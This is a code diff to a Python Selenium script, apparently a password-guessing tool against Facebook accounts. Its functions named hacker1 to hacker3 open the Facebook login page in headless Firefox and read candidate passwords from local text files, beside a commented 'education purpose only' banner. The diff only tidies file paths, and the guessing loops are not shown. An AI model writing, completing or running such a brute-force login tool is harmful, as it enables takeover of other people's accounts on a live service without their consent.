@@ -36,13 +36,13 @@ options.add_argument('--headless')
 # print('\033[1;31m' + '######made for education purpose only######' + '\033[0m')
 # print('\033[1;33m' + '....................................................................................................................................................................' + '\033[0m')
 def hacker1(input):
-    driver = Firefox(executable_path='D:/New folder(3)')
+    driver = Firefox(executable_path='D:/New folder(3)')#GIVE PATH
     driver.get("https://www.facebook.com/login")
     # email_element = driver.find_element(By.ID,'email')
     
     
 
-    a_file = open('D:/nihereeka/password.txt', "r")
+    a_file = open('password.txt', "r")
     list_of_lists = []
 
     attempts = 0
@@ -97,7 +97,7 @@ def hacker2(input2):
     newdriver.get("https://www.facebook.com/login")
     
 
-    a_file = open('D:/nihereeka/password1.txt', "r")
+    a_file = open('password1.txt', "r")
     list_of_lists = []
 
     attempts = 0
@@ -152,7 +152,7 @@ def hacker3(input3):
     newdriver2.get("https://www.facebook.com/login")
     
 
-    a_file = open('D:/nihereeka/password2.txt', "r")
+    a_file = open('password2.txt', "r")
     list_of_lists = []
 
     attempts = 0
